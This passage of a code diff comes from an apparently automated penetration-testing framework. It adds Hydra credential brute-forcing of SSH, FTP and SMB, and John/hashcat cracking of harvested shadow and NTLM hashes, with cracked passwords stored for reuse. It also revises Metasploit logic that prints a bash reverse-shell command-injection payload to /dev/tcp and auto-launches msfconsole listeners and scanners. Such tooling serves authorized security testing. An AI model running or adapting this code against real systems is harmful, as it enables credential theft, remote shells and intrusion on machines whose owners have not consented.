+    out_file = out_dir / f"gravity_hydra_{ip.replace('.','_')}_{run_id}.ndjson"
+    found_creds: list[tuple[str, str, str, int]] = []
+
+    def _run_hydra_service(svc_name: str, port: int) -> list[tuple[str, str]]:
+        log_txt = out_dir / f"hydra_{svc_name}_{ip.replace('.','_')}_{run_id[:8]}.txt"
+        cmd = [
+            "hydra",
+            "-L", str(user_file),
+            "-P", str(pass_file),
+            "-t", "4",   # polite thread count
+            "-s", str(port),
+            "-o", str(log_txt),
+            "-f",        # stop at first valid pair
+            ip, svc_name,
+        ]
+        try:
+            proc = _sp.run(cmd, capture_output=True, text=True, timeout=120)
+            output = proc.stdout + proc.stderr
+        except Exception as exc:
+            log.debug(f"[hydra] {svc_name}:{port} on {ip}: {exc}")
+            return []
+        found = []
+        for line in output.splitlines():
+            m = _re.search(r"host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(.*)", line)
+            if m:
+                found.append((m.group(1), m.group(2).strip()))
+        return found
+
+    services_tested = []
+    if ssh_port:
+        for u, p in _run_hydra_service("ssh", ssh_port):
+            found_creds.append((u, p, "ssh", ssh_port))
+        services_tested.append(f"ssh:{ssh_port}")
+    if ftp_port:
+        for u, p in _run_hydra_service("ftp", ftp_port):
+            found_creds.append((u, p, "ftp", ftp_port))
+        services_tested.append(f"ftp:{ftp_port}")
+    if smb_port:
+        for u, p in _run_hydra_service("smb", smb_port):
+            found_creds.append((u, p, "smb", smb_port))
+        services_tested.append(f"smb:{smb_port}")
+
+    events = []
+    if found_creds:
+        # Store found creds for cross-surface reuse
+        try:
+            from cred_reuse import CredentialStore as _CS
+            _cs = _CS()
+            for u, p, svc, port in found_creds:
+                _cs.add(u, p, ip, cred_type="password", origin_ip=ip)
+        except Exception:
+            pass
+
+        wicket_map = {"ssh": "HO-02", "ftp": "HO-02", "smb": "WB-19", "http": "WB-08"}
+        for u, p, svc, port in found_creds:
+            wid = wicket_map.get(svc, "HO-02")
+            domain = "host" if svc in ("ssh", "ftp", "smb") else "web"
+            events.append(envelope(
+                event_type="obs.attack.precondition",
+                source_id="skg.gravity.hydra",
+                toolchain=domain,
+                payload=precondition_payload(
+                    wicket_id=wid,
+                    label=f"credential found: {u}@{svc}:{port}",
+                    domain=domain,
+                    workload_id=f"{domain}::{ip}",
+                    realized=True,
+                    detail=f"hydra: {u} authenticated on {svc}:{port}",
+                ),
+                evidence_rank=1,
+                source_kind="hydra",
+                confidence=0.95,
+            ))
+
+        _ingest_events_to_kernel(events, ip)
+        with out_file.open("w") as fh:
+            for ev in events:
+                fh.write(json.dumps(ev) + "\n")
+        result["found_credentials"] = len(found_creds)
+        result["events_file"] = str(out_file)
+
+    result["success"] = True
+    result["unknowns_resolved"] = len(found_creds)
+    result["services_tested"] = services_tested
+    return result
+
+
+def _exec_john(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
+    """
+    Execute John the Ripper (or hashcat) against harvested hashes.
+
+    Looks for hash files written by enum4linux, ssh_sensor, or other instruments
+    in out_dir and DISCOVERY_DIR, then cracks them offline.  Cracked credentials
+    are injected back into CredentialStore for cred_reuse propagation.
+    """
+    import subprocess as _sp
+    import re as _re
+    import shutil as _sh
+    import sys as _sys
+
+    # Collect hash files from this run and recent discovery output
+    hash_files = []
+    for pattern in [
+        f"*hashes*{ip.replace('.','_')}*",
+        f"*ntlm*{ip.replace('.','_')}*",
+        f"*shadow*{ip.replace('.','_')}*",
+        f"*passwd*{ip.replace('.','_')}*",
+    ]:
+        hash_files.extend(out_dir.glob(pattern))
+        hash_files.extend(DISCOVERY_DIR.glob(pattern))
+
+    if not hash_files:
+        result["error"] = "No hash files found — run enum4linux or ssh_sensor first"
+        result["success"] = False
+        return result
+
+    # Prefer john; fall back to hashcat
+    cracker = _sh.which("john") or _sh.which("hashcat")
+    if not cracker:
+        result["error"] = "Neither john nor hashcat available"
+        result["success"] = False
+        return result
+
+    cracked: list[tuple[str, str]] = []
+    out_file = out_dir / f"gravity_john_{ip.replace('.','_')}_{run_id}.ndjson"
+
+    for hash_file in hash_files[:5]:  # limit to 5 files
+        cracked_txt = out_dir / f"john_cracked_{hash_file.stem}_{run_id[:8]}.txt"
+        try:
+            if "john" in cracker:
+                cmd = [cracker, str(hash_file), "--wordlist=/usr/share/wordlists/rockyou.txt",
+                       f"--pot={cracked_txt}"]
+            else:
+                cmd = [cracker, "-a", "0", str(hash_file), "/usr/share/wordlists/rockyou.txt",
+                       "-o", str(cracked_txt)]
+
+            proc = _sp.run(cmd, capture_output=True, text=True, timeout=300)
+            output = proc.stdout + proc.stderr
+
+            # Parse john output: "password          (username)"
+            for line in output.splitlines():
+                m = _re.match(r"^(\S.*?)\s+\((\S+)\)", line)
+                if m:
+                    cracked.append((m.group(2), m.group(1)))
+        except Exception as exc:
+            log.debug(f"[john] {hash_file.name}: {exc}")
+
+    if cracked:
+        try:
+            _sys.path.insert(0, str(Path(__file__).parent))
+            from cred_reuse import CredentialStore as _CS
+            _cs = _CS()
+            for user, pwd in cracked:
+                _cs.add(user, pwd, ip, cred_type="password", origin_ip=ip)
+        except Exception:
+            pass
+
+        events = []
+        for user, pwd in cracked:
+            events.append(envelope(
+                event_type="obs.attack.precondition",
+                source_id="skg.gravity.john",
+                toolchain="host",
+                payload=precondition_payload(
+                    wicket_id="HO-03",
+                    label=f"hash cracked: {user}",
+                    domain="host",
+                    workload_id=f"host::{ip}",
+                    realized=True,
+                    detail=f"john cracked hash for {user}",
+                ),
+                evidence_rank=1,
+                source_kind="john",
+                confidence=0.90,
+            ))
+        _ingest_events_to_kernel(events, ip)
+        with out_file.open("w") as fh:
+            for ev in events:
+                fh.write(json.dumps(ev) + "\n")
+        result["cracked_hashes"] = len(cracked)
+        result["events_file"] = str(out_file)
+
+    result["success"] = True
+    result["unknowns_resolved"] = len(cracked)
+    return result
+
+
 def _exec_gobuster(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
     """Execute gobuster web directory enumeration."""
-    port = _find_web_port_for_target(target)
+    port = _web_port_from_ip_or_target(ip, target)
+    if port is None:
+        result["error"] = "No web service discovered on target yet — run nmap first"
+        result["success"] = False
+        return result
+    host = _strip_url_scheme(ip)
     scheme = "https" if port in (443, 8443) else "http"
-    url = f"{scheme}://{ip}:{port}"
+    # Use standard port notation (omit :80 or :443) to avoid redirect issues
+    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
+        url = f"{scheme}://{host}"
+    else:
+        url = f"{scheme}://{host}:{port}"
     out_file = out_dir / f"gravity_gobuster_{ip.replace('.','_')}_{run_id}.ndjson"
     try:
-        import sys as _sys
-        import importlib.util as _ilu
-        skg_web_path = str(SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active")
-        if skg_web_path not in _sys.path:
-            _sys.path.insert(0, skg_web_path)
-        spec = _ilu.spec_from_file_location("gobuster_adapter",
-            SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active" / "gobuster_adapter.py")
-        mod = _ilu.module_from_spec(spec)
-        spec.loader.exec_module(mod)
-        events = mod.run_gobuster(url, out_file)
+        from skg_services.gravity.web_runtime import collect_gobuster_events_to_file
+        events = collect_gobuster_events_to_file(url, out_path=out_file)
         result["events_file"] = str(out_file)
         result["unknowns_resolved"] = len([e for e in events
             if e.get("payload",{}).get("status") == "realized"])
@@ -2788,6 +3813,25 @@ def _exec_gobuster(ip: str, target: dict, run_id: str, out_dir: Path, result: di
             _ingest_events_to_kernel(events, ip)
     except Exception as exc:
         log.warning(f"[gobuster] {ip}: {exc}")
+        # Fallback: run gobuster directly via subprocess
+        try:
+            import subprocess as _sp
+            wordlist = "/usr/share/wordlists/dirb/common.txt"
+            if not Path(wordlist).exists():
+                wordlist = "/usr/share/dirb/wordlists/common.txt"
+            if not Path(wordlist).exists():
+                result["error"] = "gobuster adapter and wordlist not found"
+                return result
+            out_txt = out_dir / f"gobuster_{ip.replace('.','_')}_{run_id[:8]}.txt"
+            gb_cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-o", str(out_txt), "-q", "--no-error"]
+            proc = _sp.run(gb_cmd, capture_output=True, text=True, timeout=120)
+            discovered = [line.split()[0] for line in (proc.stdout or "").splitlines()
+                          if line.startswith("/")]
+            if discovered:
+                result["success"] = True
+                result["unknowns_resolved"] = len(discovered)
+        except Exception as exc2:
+            log.warning(f"[gobuster-fallback] {ip}: {exc2}")
     return result
 
 
@@ -2802,13 +3846,10 @@ def _exec_sqlmap(ip: str, target: dict, run_id: str, out_dir: Path,
     scheme = "https" if port in (443, 8443) else "http"
     url = f"{scheme}://{ip}:{port}/"
     try:
-        import importlib.util as _ilu
-        spec = _ilu.spec_from_file_location("sqlmap_adapter",
-            SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active" / "sqlmap_adapter.py")
-        mod = _ilu.module_from_spec(spec)
-        spec.loader.exec_module(mod)
-        events = mod.run_sqlmap(url, out_dir)
-        result["events_file"] = str(out_dir / f"sqlmap_events_{run_id}.ndjson")
+        from skg_services.gravity.web_runtime import collect_sqlmap_events_to_file
+        _sqlmap_out = out_dir / f"sqlmap_events_{run_id}.ndjson"
+        events = collect_sqlmap_events_to_file(url, out_path=_sqlmap_out)
+        result["events_file"] = str(_sqlmap_out)
         result["unknowns_resolved"] = len([e for e in events
             if e.get("payload",{}).get("status") == "realized"])
         if events:
@@ -2821,11 +3862,7 @@ def _exec_sqlmap(ip: str, target: dict, run_id: str, out_dir: Path,
 def _exec_enum4linux(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
     """Execute enum4linux SMB/AD enumeration."""
     try:
-        import importlib.util as _ilu
-        spec = _ilu.spec_from_file_location("enum4linux_adapter",
-            SKG_HOME / "skg-host-toolchain" / "adapters" / "smb_collect" / "enum4linux_adapter.py")
-        mod = _ilu.module_from_spec(spec)
-        spec.loader.exec_module(mod)
+        from skg_services.gravity.host_runtime import collect_enum4linux_events_to_file
         # Pass any known credentials from CredentialStore
         username, password = "", ""
         try:
@@ -2839,7 +3876,10 @@ def _exec_enum4linux(ip: str, target: dict, run_id: str, out_dir: Path, result: 
                 break
         except Exception:
             pass
-        events = mod.run_enum4linux(ip, out_dir, username=username, password=password)
+        _e4l_out = out_dir / f"enum4linux_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+        events = collect_enum4linux_events_to_file(
+            ip, out_path=_e4l_out, username=username, password=password
+        )
         result["unknowns_resolved"] = len([e for e in events
             if e.get("payload",{}).get("status") == "realized"])
         if events:
@@ -2851,22 +3891,55 @@ def _exec_enum4linux(ip: str, target: dict, run_id: str, out_dir: Path, result: 
 
 def _exec_nikto(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
     """Execute nikto web vulnerability scan."""
-    port = _find_web_port_for_target(target)
+    port = _web_port_from_ip_or_target(ip, target)
+    if port is None:
+        result["error"] = "No web service discovered on target yet — run nmap first"
+        result["success"] = False
+        return result
+    host = _strip_url_scheme(ip)
     scheme = "https" if port in (443, 8443) else "http"
-    url = f"{scheme}://{ip}:{port}"
+    # Nikto accepts hostname:port or full URLs; use hostname:port for clarity
+    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
+        url = f"{scheme}://{host}"
+    else:
+        url = f"{scheme}://{host}:{port}"
     try:
-        import importlib.util as _ilu
-        spec = _ilu.spec_from_file_location("nikto_adapter",
-            SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active" / "nikto_adapter.py")
-        mod = _ilu.module_from_spec(spec)
-        spec.loader.exec_module(mod)
-        events = mod.run_nikto(url, out_dir)
-        result["unknowns_resolved"] = len([e for e in events
-            if e.get("payload",{}).get("status") == "realized"])
+        from skg_services.gravity.web_runtime import collect_nikto_events_to_file
+
+        events_file = out_dir / f"gravity_nikto_{ip.replace('.','_')}_{run_id}.ndjson"
+        # Derive attack_path_id from current unknown wickets rather than hardcoding.
+        # Priority: SQLi chain > CVE chain > info disclosure > general surface.
+        _ws = (target.get("wicket_states") or {}) if isinstance(target, dict) else {}
+        _unknown = {w for w, s in _ws.items() if s == "unknown"}
+        if _unknown & {"WB-41", "WB-09", "WB-10"}:
+            _apt = "web_sqli_to_shell_v1"
+        elif _unknown & {"WB-03", "WB-04", "WB-11"}:
+            _apt = "web_cve_exploitation_v1"
+        elif _unknown & {"WB-07", "WB-17", "WB-08"}:
+            _apt = "web_info_disclosure_v1"
+        else:
+            _apt = "web_surface_v1"
+
+        from skg.identity.workload import canonical_workload_id as _cwid
+        events = collect_nikto_events_to_file(
+            url,
+            out_path=events_file,
+            out_dir=out_dir,
+            attack_path_id=_apt,
+            run_id=run_id,
+            workload_id=_cwid(host, domain="web"),
+        )
+
+        result["events_file"] = str(events_file)
+        result["unknowns_resolved"] = len(
+            [e for e in events if e.get("payload", {}).get("status") == "realized"]
+        )
+        result["success"] = True
         if events:
             _ingest_events_to_kernel(events, ip)
     except Exception as exc:
         log.warning(f"[nikto] {ip}: {exc}")
+        result["error"] = str(exc)
     return result
 
 
@@ -2879,12 +3952,9 @@ def _exec_searchsploit(ip: str, target: dict, run_id: str, out_dir: Path, result
     if not banners:
         return result
     try:
-        import importlib.util as _ilu
-        spec = _ilu.spec_from_file_location("searchsploit_adapter",
-            SKG_HOME / "skg-host-toolchain" / "adapters" / "ssh_collect" / "searchsploit_adapter.py")
-        mod = _ilu.module_from_spec(spec)
-        spec.loader.exec_module(mod)
-        events = mod.run_searchsploit(banners, out_dir)
+        from skg_services.gravity.host_runtime import collect_searchsploit_events_to_file
+        _ss_out = out_dir / f"searchsploit_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+        events = collect_searchsploit_events_to_file(banners, out_path=_ss_out)
         result["unknowns_resolved"] = len([e for e in events
             if e.get("payload",{}).get("status") == "realized"])
         if events:
@@ -3263,10 +4333,10 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
         s = st.get(wid, {})
         return s.get("status") == "realized" if isinstance(s, dict) else str(s) == "realized"
 
-    cmdi_confirmed  = is_realized("WB-14")
-    sqli_confirmed  = is_realized("WB-09")
-    upload_confirmed= is_realized("WB-21") or is_realized("WB-13")
-    auth_confirmed  = is_realized("WB-08") or is_realized("WB-06")
+    cmdi_confirmed  = is_realized("WB-43")          # cmdi_injectable
+    sqli_confirmed  = is_realized("WB-41")          # sqli_injectable
+    upload_confirmed= is_realized("WB-21") or is_realized("WB-13")  # webshell_present / cve_version_match
+    auth_confirmed  = is_realized("WB-05") or is_realized("WB-10")  # admin_interface_exposed / default_credentials
 
     # LHOST = attacker box IP for reverse shell payloads (auto-detected)
     try:
@@ -3279,12 +4349,30 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
         LHOST = "127.0.0.1"
     LPORT = 4444
 
+    # Extract discovered web paths from target state (set by gobuster/nikto events)
+    _discovered_paths = []
+    if isinstance(target, dict):
+        for ev in (target.get("events") or []):
+            _detail = ev.get("payload", {}).get("detail", "")
+            import re as _re
+            _discovered_paths += _re.findall(r"(/[^\s,]+)", _detail)
+
+    def _best_path(candidates):
+        """Return first discovered path matching any candidate hint, or empty string."""
+        for hint in candidates:
+            for p in _discovered_paths:
+                if hint.lower() in p.lower():
+                    return p
+        return ""
+
     if cmdi_confirmed:
         # ── CMDI → reverse shell via command injection ─────────────────────
-        cmdi_url   = f"http://{ip}:{port}/vulnerabilities/exec/"
-        payload    = f"; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
+        # Use discovered exec/cmd path if available; avoid hardcoded DVWA paths
+        cmdi_path = _best_path(["exec", "cmd", "command", "rce", "ping"]) or "/<cmdi_path>"
+        cmdi_url  = f"http://{ip}:{port}{cmdi_path}"
+        payload   = f"; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
         rc_lines = [
-            f"# CMDI confirmed (WB-14) — exploit/multi/handler for {ip}:{port}",
+            f"# CMDI confirmed (WB-43) — exploit/multi/handler for {ip}:{port}",
             f"use exploit/multi/handler",
             f"set PAYLOAD linux/x64/meterpreter/reverse_tcp",
             f"set LHOST {LHOST}",
@@ -3296,19 +4384,19 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
             f"sessions -l",
             f"exit -y",
             f"",
-            f"# Deliver payload manually:",
+            f"# Deliver payload via discovered endpoint:",
             f"# URL: {cmdi_url}",
-            f"# Param: ip",
             f"# Payload: {payload}",
         ]
-        desc = f"exploit/multi/handler (CMDI WB-14 confirmed) against {ip}:{port} — deliver: {payload[:60]}"
+        desc = f"exploit/multi/handler (CMDI WB-43 confirmed) against {ip}:{port}"
         confidence = 0.92
         module_candidates = [{"module":"exploit/multi/handler","confidence":0.92,"module_class":"exploit"}]
 
     elif upload_confirmed and auth_confirmed:
         # ── File upload + auth → webshell upload ──────────────────────────
+        upload_path = _best_path(["upload", "file", "attach", "import"]) or "/<upload_path>"
         rc_lines = [
-            f"# File upload confirmed (WB-13/21) — webshell via upload for {ip}:{port}",
+            f"# File upload confirmed (WB-13/21) + auth (WB-05/10) — webshell via upload for {ip}:{port}",
             f"use exploit/multi/handler",
             f"set PAYLOAD php/meterpreter/reverse_tcp",
             f"set LHOST {LHOST}",
@@ -3320,7 +4408,7 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
             f"sessions -l",
             f"exit -y",
             f"",
-            f"# Upload webshell to: http://{ip}:{port}/vulnerabilities/upload/",
+            f"# Upload webshell to discovered path: http://{ip}:{port}{upload_path}",
         ]
         desc = f"exploit/multi/handler (upload WB-13/21 confirmed) against {ip}:{port}"
         confidence = 0.85
@@ -3328,12 +4416,13 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
 
     elif sqli_confirmed:
         # ── SQLi confirmed → data extraction ──────────────────────────────
+        sqli_path = _best_path(["sqli", "sql", "search", "query", "id=", "user="]) or "/"
         rc_lines = [
-            f"# SQLi confirmed (WB-09) — extraction for {ip}:{port}",
+            f"# SQLi confirmed (WB-41) — extraction for {ip}:{port}",
             f"use auxiliary/scanner/http/sql_injection",
             f"set RHOSTS {ip}",
             f"set RPORT {port}",
-            f"set TARGETURI /vulnerabilities/sqli/",
+            f"set TARGETURI {sqli_path}",
             f"run",
             f"",
             f"# Also try blind SQLi:",
@@ -3342,7 +4431,7 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
             f"set RPORT {port}",
             f"run",
         ]
-        desc = f"SQLi extraction (WB-09 confirmed) against {ip}:{port}"
+        desc = f"SQLi extraction (WB-41 confirmed) against {ip}:{port}"
         confidence = 0.88
         module_candidates = [
             {"module":"auxiliary/scanner/http/sql_injection","confidence":0.88,"module_class":"auxiliary"},
@@ -3582,11 +4671,11 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
                 start_new_session=True,
                 close_fds=True,
             )
+            _cmdi_hint = _best_path(["exec", "cmd", "command", "rce", "ping"]) or "/<cmdi_path>"
             print(f"    [MSF] AUTO-EXEC PID={proc.pid}")
             print(f"    [MSF] Listener log: {log_file}")
-            print(f"    [MSF] Deliver payload:")
-            print(f"          URL: http://{ip}:{port}/vulnerabilities/exec/")
-            print(f"          Param: ip")
+            print(f"    [MSF] Deliver payload via discovered endpoint:")
+            print(f"          URL: http://{ip}:{port}{_cmdi_hint}")
             print(f"          Payload: ; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'")
             print(f"    [MSF] Then await session: skg proposals trigger {proposal['id']} --await-session")
             # Update proposal to triggered
@@ -3648,6 +4737,33 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
                 if post_result.get("success"):
                     result["post_events"] = post_result.get("events", 0)
                     result["post_events_file"] = post_result.get("events_file","")
+            return result
+
+    elif authorized and not cmdi_confirmed:
+        # ── Authorized + enumeration/SQLi mode = auto-run auxiliary modules ──
+        # Auxiliary modules (scanners, version checks) are safe to run without
+        # operator confirmation in an authorized engagement. Exploit modules
+        # (multi/handler) still require the CMDI gate above.
+        import subprocess as _sp
+        msf_bin = _sp.run(["which", "msfconsole"], capture_output=True)
+        if msf_bin.returncode == 0:
+            log_file = out_dir / f"msf_enum_{ip.replace('.', '_')}_{run_id[:8]}.log"
+            _log_fh = open(log_file, "w")
+            proc = _sp.Popen(
+                ["msfconsole", "-q", "-r", str(rc_file)],
+                stdin=_sp.DEVNULL,
+                stdout=_log_fh,
+                stderr=_sp.STDOUT,
+                start_new_session=True,
+                close_fds=True,
+            )
+            print(f"    [MSF] ENUM AUTO-EXEC PID={proc.pid}")
+            print(f"    [MSF] Log: {log_file}")
+            result["success"]     = True
+            result["action"]      = "auto_executed_enum"
+            result["rc_file"]     = str(rc_file)
+            result["proposal_id"] = proposal["id"]
+            result["pid"]         = proc.pid
             return result
 
     result["success"]     = True
@@ -3739,26 +4855,22 @@ def _exec_pcap(ip, target, run_id, out_dir, result):
                 _wid = {21: "HO-01", 22: "HO-02", 23: "HO-01", 25: "HO-01",
                         80: "WB-01", 110: "HO-01", 143: "HO-01",
                         389: "AD-01", 445: "HO-19", 5985: "HO-02"}.get(_port, "HO-01")
-                _ev = {
-                    "id": str(uuid.uuid4()), "ts": now_ts,
-                    "type": "obs.attack.precondition",
-                    "source": {"source_id": "pcap_probe", "toolchain": "pcap", "version": "0"},
-                    "payload": {
-                        "wicket_id": _wid, "status": "realized",
-                        "workload_id": f"host::{ip}", "target_ip": ip,
-                        "detail": f"TCP probe port {_port} — banner: {_banner}",
-                        "run_id": run_id,
-                    },
-                    "provenance": {
-                        "evidence_rank": 3,
-                        "evidence": {
-                            "source_kind": "tcp_banner_grab",
-                            "pointer": f"tcp://{ip}:{_port}",
-                            "collected_at": now_ts,
-                            "confidence": 0.85,
-                        },
-                    },
-                }
+                _ev = _gravity_precondition_event(
+                    source_id="pcap_probe",
+                    toolchain="pcap",
+                    wicket_id=_wid,
+                    status="realized",
+                    workload_id=f"host::{ip}",
+                    target_ip=ip,
+                    detail=f"TCP probe port {_port} — banner: {_banner}",
+                    evidence_rank=3,
+                    source_kind="tcp_banner_grab",
+                    pointer=f"tcp://{ip}:{_port}",
+                    confidence=0.85,
+                    run_id=run_id,
+                    version="0",
+                    ts=now_ts,
+                )
                 _banner_events.append(_ev)
 
             if _banner_events:
@@ -3797,6 +4909,19 @@ def _exec_pcap(ip, target, run_id, out_dir, result):
     return result
 
 
+def _strip_url_scheme(addr: str) -> str:
+    """Strip http:// or https:// from an address so it can be used as a nmap/ssh target."""
+    if "://" in addr:
+        try:
+            from urllib.parse import urlparse as _up
+            parsed = _up(addr)
+            host = parsed.hostname or addr
+            return host
+        except Exception:
+            pass
+    return addr
+
+
 def _exec_nmap(ip, target, run_id, out_dir, result):
     """
     Run nmap version detection and emit wicket events from the results.
@@ -3809,6 +4934,9 @@ def _exec_nmap(ip, target, run_id, out_dir, result):
     Writes events to DISCOVERY_DIR so load_wicket_states reads them.
     """
     import xml.etree.ElementTree as ET
+
+    # Nmap only accepts hostnames/IPs — strip any URL scheme (http://, https://)
+    ip = _strip_url_scheme(ip)
 
     xml_file    = out_dir / f"nmap_{ip}_{run_id[:8]}.xml"
     events_file = out_dir / f"gravity_nmap_{ip}_{run_id[:8]}.ndjson"
@@ -3830,15 +4958,14 @@ def _exec_nmap(ip, target, run_id, out_dir, result):
     declared_ports = set(int(p) for p in known_ports if str(p).isdigit())
 
     if first_contact:
-        # Comprehensive first contact: top-1000 + declared + common.
-        # Use explicit list so non-standard ports (e.g. 8082) aren't missed.
-        all_ports = set(_COMMON_PORTS) | declared_ports
-        port_str = ",".join(str(p) for p in sorted(all_ports))
-        nmap_port_args = ["--top-ports", "1000", "--exclude-ports",
-                          "0"] if not declared_ports else ["-p", port_str + ",1-1024"]
-        # Simpler: just union declared + top ports via explicit list
+        # First contact: common service ports + any declared ports from targets.yaml.
+        # Note: --top-ports and -p conflict in nmap (the -p argument overrides
+        # --top-ports).  Use an explicit port list instead so declared ports are
+        # always included and we know exactly what gets scanned.
+        all_first_ports = set(_COMMON_PORTS) | declared_ports
+        port_str = ",".join(str(p) for p in sorted(all_first_ports))
         nmap_port_args = ["-p", port_str]
-        scan_label = f"first-contact ({len(all_ports)} ports)"
+        scan_label = f"first-contact ({len(all_first_ports)} ports{' + ' + str(len(declared_ports)) + ' declared' if declared_ports else ''})"
     else:
         # Follow-on: union of known + all common service ports
         all_ports = declared_ports | set(_COMMON_PORTS)
@@ -3870,14 +4997,32 @@ def _exec_nmap(ip, target, run_id, out_dir, result):
     # Use -sT (TCP connect) rather than -sS (SYN) so Docker-NAT port mappings
     # are visible. SYN scan bypasses the kernel's conntrack/DNAT chain and
     # sees NAT-forwarded ports as filtered even when they are open.
-    nmap_cmd = ["nmap", "-n", "-Pn", "-sT", "-sV",
-                f"--script={base_scripts}",
-                *nmap_port_args,
-                "-oX", str(xml_file), "--open", ip]
+    # -O: OS detection. -A: OS+version+scripts+traceroute. -T4: fast timing.
+    # --script-args=unsafe=1: allows SMB vuln scripts (ms17-010 etc) to probe.
+    # Loopback (127.x) and local gateway addresses don't need vuln scripts or
+    # OS detection — they're always reachable and services are already known.
+    # Vuln/vulners scripts make external API calls which can be very slow.
+    _is_loopback = ip.startswith("127.") or ip == "::1" or ip.lower() == "localhost"
+    vuln_script_args = "unsafe=1"
+    if _is_loopback:
+        # Fast scan: no vuln category (external API calls), no OS detection
+        full_scripts = base_scripts
+        nmap_cmd = ["nmap", "-n", "-Pn", "-sT", "-sV", "-T5",
+                    f"--script={full_scripts}",
+                    f"--script-args={vuln_script_args}",
+                    *nmap_port_args,
+                    "-oX", str(xml_file), "--open", ip]
+    else:
+        full_scripts = base_scripts + ",vuln"
+        nmap_cmd = ["nmap", "-n", "-Pn", "-sT", "-sV", "-O", "-T4",
+                    f"--script={full_scripts}",
+                    f"--script-args={vuln_script_args}",
+                    *nmap_port_args,
+                    "-oX", str(xml_file), "--open", ip]
     try:
         scan = subprocess.run(
             nmap_cmd,
-            capture_output=True, text=True, timeout=600
+            capture_output=True, text=True, timeout=120
         )
     except subprocess.TimeoutExpired as exc:
         if xml_file.exists() and xml_file.stat().st_size > 2000:
@@ -3906,28 +5051,43 @@ def _exec_nmap(ip, target, run_id, out_dir, result):
     now = iso_now()
 
     def _ev(wicket_id, status, rank, confidence, detail):
-        return {
-            "id": str(uuid.uuid4()), "ts": now,
-            "type": "obs.attack.precondition",
-            "source": {"source_id": "nmap", "toolchain": "skg-host-toolchain", "version": "0"},
-            "payload": {
-                "wicket_id": wicket_id, "status": status,
-                "workload_id": f"nmap::{ip}", "target_ip": ip,
-                "detail": detail, "run_id": run_id,
-            },
-            "provenance": {
-                "evidence_rank": rank,
-                "evidence": {"source_kind": "nmap_scan", "pointer": f"nmap://{ip}",
-                             "collected_at": now, "confidence": confidence},
-            },
-        }
+        return _gravity_precondition_event(
+            source_id="nmap",
+            toolchain="skg-host-toolchain",
+            wicket_id=wicket_id,
+            status=status,
+            workload_id=f"host::{ip}",
+            target_ip=ip,
+            detail=detail,
+            evidence_rank=rank,
+            source_kind="nmap_scan",
+            pointer=f"nmap://{ip}",
+            confidence=confidence,
+            run_id=run_id,
+            version="0",
+            ts=now,
+        )
 
     try:
         tree = ET.parse(xml_file)
         root = tree.getroot()
         host_el = root.find("host")
         if host_el is None:
-            result["error"] = f"nmap: {_scan_output_summary(scan)}"
+            # Host is up (per runstats) but no open ports found in scanned range.
+            # Emit a reachability event if host was confirmed up, then return.
+            _runstats = root.find("runstats/hosts")
+            _hosts_up = int((_runstats.get("up") or "0") if _runstats is not None else "0")
+            if _hosts_up > 0:
+                events.append(_ev("HO-01", "realized", 3, 0.7,
+                                  f"Host up (nmap confirms reachability; no open ports in scanned range)"))
+                with open(events_file, "w") as fh:
+                    for ev in events:
+                        fh.write(json.dumps(ev) + "\n")
+                result["success"] = True
+                result["events_written"] = len(events)
+                result["detail"] = f"nmap: host up, no open ports in scanned range"
+            else:
+                result["error"] = f"nmap: {_scan_output_summary(scan)}"
             return result
         status_el = host_el.find("status")
         if status_el is not None and status_el.get("state") not in (None, "up"):
@@ -3974,7 +5134,7 @@ def _exec_nmap(ip, target, run_id, out_dir, result):
 
             # RDP
             if portid == "3389" or "rdp" in svc_name or "ms-wbt" in svc_name:
-                events.append(_ev("HO-03", "realized", 4, 0.95,
+                events.append(_ev("HO-20", "realized", 4, 0.95,
                                   f"RDP on port {portid}" + (f" — {banner}" if banner else "")))
 
             # LDAP / AD
@@ -3989,7 +5149,7 @@ def _exec_nmap(ip, target, run_id, out_dir, result):
 
             # WinRM
             if portid in ("5985", "5986") or "wsman" in svc_name or "winrm" in svc_name:
-                events.append(_ev("HO-02", "realized", 4, 0.90,
+                events.append(_ev("HO-04", "realized", 4, 0.90,
                                   f"WinRM on port {portid} — remote shell vector"))
 
             # FTP
@@ -4160,25 +5320,26 @@ def _exec_binary_analysis(ip, target, run_id, out_dir, result):
             print(f"    [BIN] SSH adapter failed ({_ba_exc}); falling back to exploit_dispatch")
 
     def _ev(wid, status, rank, conf, detail):
-        return {
-            "id":   str(uuid.uuid4()),
-            "ts":   datetime.now(timezone.utc).isoformat(),
-            "type": "obs.attack.precondition",
-            "source": {"source_id": "gravity.binary_analysis",
-                       "toolchain": "skg-binary-toolchain", "version": "0.1.0"},
-            "payload": {
-                "wicket_id": wid, "status": status,
-                "workload_id": workload_id, "detail": detail[:400],
-                "attack_path_id": attack_path_id, "run_id": run_id,
-                "observed_at": datetime.now(timezone.utc).isoformat(),
-                "target_ip": ip,
-            },
-            "provenance": {"evidence_rank": rank,
-                           "evidence": {"source_kind": "binary_scanner",
-                                        "pointer": f"ssh://{ip}",
-                                        "collected_at": datetime.now(timezone.utc).isoformat(),
-                                        "confidence": conf}},
-        }
